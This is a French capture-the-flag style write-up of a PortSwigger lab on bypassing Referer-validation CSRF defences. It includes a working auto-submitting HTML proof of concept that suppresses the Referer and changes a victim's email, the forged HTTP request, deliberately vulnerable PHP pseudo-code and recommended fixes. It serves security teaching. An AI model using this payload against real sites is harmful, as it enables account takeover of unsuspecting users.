# Challenge 5 : CSRF - Referer Validation Bypass

## Informations

**Plateforme** : PortSwigger Web Security Academy
**URL** : https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present
**Categorie** : CSRF
**Difficulte** : Facile

## Objectif

Contourner la validation du header Referer pour exécuter une attaque CSRF et changer l'adresse email de la victime à son insu.

## Reconnaissance

1. **Identification de la fonctionnalité** : J'ai observé que le changement d'email se fait via une requête `POST` vers `/my-account/change-email`.
2. **Analyse de la protection** : La requête inclut un header `Referer` qui pointe vers le domaine du laboratoire.
3. **Tests de comportement** :
   - J'ai modifié le domaine dans le Referer pour une valeur externe -> **Requête rejetée** (400 Bad Request / Error).
   - J'ai supprimé complètement le header Referer de la requête -> **Requête acceptée** (200 OK / 302 Found).

**Conclusion** : L'application valide le Referer s'il est présent, mais autorise la requête s'il est absent (Insecure Fallback).

## Methode d'exploitation

1. Créer une page HTML malveillante sur le serveur d'exploit.
2. Utiliser une balise `<meta>` spécifique pour instruire le navigateur de ne **jamais** envoyer le header Referer.
3. Créer un formulaire caché ciblant l'URL du laboratoire avec la méthode POST.
4. Utiliser JavaScript pour soumettre le formulaire automatiquement au chargement de la page.
5. Livrer l'exploit à la victime ("Deliver to victim").

## Payload/POC utilise

```html
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
      <input type="submit" value="Submit request" />
    </form>
    
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
````

## Requete HTTP

Voici à quoi ressemble la requête malveillante envoyée par le navigateur de la victime (noter l'absence de la ligne `Referer`) :

```http
POST /my-account/change-email HTTP/1.1
Host: 0a940080039622ec81923e5e00ae0096.web-security-academy.net
Cookie: session=Rj0FGMU4zQOsFYohugol2uTD9SXX9aWE
User-Agent: Mozilla/5.0 ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

email=pwned%40evil-user.net
```

## Explication

Le serveur utilise une logique défaillante : il part du principe que si le header `Referer` est manquant, la requête est légitime (probablement pour ne pas bloquer les navigateurs qui ne l'envoient pas pour des raisons de vie privée ou les antivirus qui le filtrent).

En ajoutant `<meta name="referrer" content="no-referrer">` dans notre exploit, nous forçons le navigateur de la victime à ne pas inclure cet en-tête. Le serveur reçoit la requête sans Referer, passe dans la branche "else" de sa condition de sécurité, et valide l'action.

## Screenshots

  - [ ] with\_referer.png : Requete normale avec Referer (acceptée)
  - [ ] without\_referer.png : Requete interceptée sans Referer (acceptée aussi)
  - [ ] exploit.png : Configuration de l'Exploit Server
  - [ ] flag.png : Message "Congratulations, you solved the lab\!"

## Code vulnerable

(Pseudo-code illustrant la faille côté serveur)

```php
$referer = $_SERVER['HTTP_REFERER'];

// VULNÉRABILITÉ : La vérification ne se fait QUE si le referer existe
if (isset($referer) && !str_contains($referer, "web-security-academy.net")) {
    die("Invalid Referer");
}

// Si le referer est absent, le code continue ici...
change_email($_POST['email']);
```

## Correction recommandee

(Pseudo-code sécurisé)

```php
session_start();

// 1. Utiliser un Token CSRF (Méthode recommandée)
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF Token Invalid");
}

// 2. Ou forcer la présence du Referer (Moins robuste)
$referer = $_SERVER['HTTP_REFERER'];
if (!isset($referer) || !str_contains($referer, "web-security-academy.net")) {
    die("Security Violation");
}
```

## Mesures de securisation

1.  **Tokens CSRF** : Implémenter des jetons anti-CSRF imprévisibles et liés à la session utilisateur (la seule vraie défense robuste).
2.  **SameSite Cookies** : Configurer l'attribut `SameSite=Strict` ou `Lax` sur les cookies de session.
3.  **Validation stricte** : Si le Referer est vérifié, il doit être obligatoire.
4.  **Origin Header** : Vérifier le header `Origin` en priorité s'il est présent.

## References

  - PortSwigger CSRF Referer: https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses
  - OWASP CSRF Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site\_Request\_Forgery\_Prevention\_Cheat\_Sheet.html
  - MDN Meta Referrer: https://www.google.com/search?q=https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta/name/referrer

## Notes

La balise meta `no-referrer` est un outil puissant pour les tests d'intrusion car elle permet de transformer une requête qui échouerait à cause d'un mauvais domaine référent en une requête "anonyme" qui passe souvent les filtres mal configurés.

-----

Date : 03/12/2025
Statut : [x] Resolu

```
```